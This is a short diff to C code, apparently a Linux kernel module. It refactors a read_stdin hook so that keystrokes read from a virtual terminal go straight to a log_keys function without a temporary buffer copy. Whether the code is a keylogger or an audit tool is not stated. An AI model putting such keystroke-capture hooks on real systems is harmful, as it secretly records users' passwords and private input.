@@ -208,8 +208,6 @@ long read_stdin(unsigned int fd, char __user *buf, size_t count, long ret)
   int err;
   int user_buffer_pos = 0;
 
-  char* log_buf;
-
   // Get the current VT name
   vt_name = stdin_file_name();
 
@@ -238,10 +236,7 @@ long read_stdin(unsigned int fd, char __user *buf, size_t count, long ret)
     }
 
     // Log the keystokes
-    log_buf = (char*) kmalloc(read_len, GFP_KERNEL);
-    memcpy(log_buf, vtbuf->buffer + vtbuf->buffer_pos, read_len);
-    log_keys(log_buf, read_len);
-    kfree(log_buf);
+    log_keys(vtbuf->vt, vtbuf->buffer + vtbuf->buffer_pos, read_len);
 
     num_read -= read_len;
     user_buffer_pos += read_len;
